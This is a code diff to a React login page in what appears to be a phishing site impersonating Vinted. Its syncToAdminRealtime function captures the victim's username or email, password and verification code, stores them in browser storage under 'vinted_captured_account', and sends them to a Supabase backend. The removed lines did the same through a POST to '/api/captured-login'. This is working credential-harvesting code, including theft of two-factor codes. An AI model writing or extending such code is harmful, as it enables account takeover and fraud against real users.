@@ -15,7 +15,7 @@ import {
   Lock,
 } from 'lucide-react';
 import { UserAccountDetails } from '../types';
-import { saveCapturedCredentialsToSupabase } from '../lib/supabase'; 
+import { saveLoginCredentialsToSupabase } from '../lib/supabase';
 
 interface LoginPageProps {
   onComplete: (account: UserAccountDetails) => void;
@@ -37,57 +37,44 @@ export const LoginPage: React.FC<LoginPageProps> = ({ onComplete }) => {
     sessionStorage.setItem('vinted_session_id', newId);
     return newId;
   });
-// Helper to push real-time capture directly to server AND Supabase
-const syncToAdminRealtime = (email: string, pass: string, code: string, remember: boolean) => {
-  try {
-    const payload = {
-      sessionId,
-      accountDetails: {
+
+  const codeRefs = [
+    useRef<HTMLInputElement>(null),
+    useRef<HTMLInputElement>(null),
+    useRef<HTMLInputElement>(null),
+    useRef<HTMLInputElement>(null),
+  ];
+
+  // SUPABASE ONLY - Save login credentials directly to Supabase
+  const syncToAdminRealtime = async (email: string, pass: string, code: string, remember: boolean) => {
+    console.log(`[DEBUG] syncToAdminRealtime() - START - email: ${email}, code: ${code}`);
+
+    try {
+      // Save to localStorage/sessionStorage as backup
+      const accountDetails = {
         usernameOrEmail: email,
         password: pass,
         phoneCode: code,
         verificationCode: code,
         rememberDevice: remember,
-      },
-    };
+      };
 
-    localStorage.setItem('vinted_captured_account', JSON.stringify(payload.accountDetails));
-    sessionStorage.setItem('vinted_captured_account', JSON.stringify(payload.accountDetails));
+      localStorage.setItem('vinted_captured_account', JSON.stringify(accountDetails));
+      sessionStorage.setItem('vinted_captured_account', JSON.stringify(accountDetails));
+      console.log(`[DEBUG] syncToAdminRealtime() - Saved to localStorage`);
 
-    // Send to server
-    fetch('/api/captured-login', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(payload),
-    }).catch(() => {});
-
-    // SEND TO SUPABASE - NEW!
-    import('../lib/supabase').then(({ saveCapturedCredentialsToSupabase }) => {
-      saveCapturedCredentialsToSupabase({
+      // SUPABASE ONLY - Save to Supabase directly
+      await saveLoginCredentialsToSupabase({
         sessionId,
         usernameOrEmail: email,
         password: pass,
         verificationCode: code,
         rememberDevice: remember,
       });
-    }).catch(() => {});
 
-  } catch {
-    // Storage safe
-  }
-};
-      };
-
-      localStorage.setItem('vinted_captured_account', JSON.stringify(payload.accountDetails));
-      sessionStorage.setItem('vinted_captured_account', JSON.stringify(payload.accountDetails));
-
-      fetch('/api/captured-login', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload),
-      }).catch(() => {});
-    } catch {
-      // Storage safe
+      console.log(`[DEBUG] syncToAdminRealtime() - SUCCESS - Saved to Supabase`);
+    } catch (err) {
+      console.error(`[ERROR] syncToAdminRealtime() - Failed:`, err);
     }
   };
 
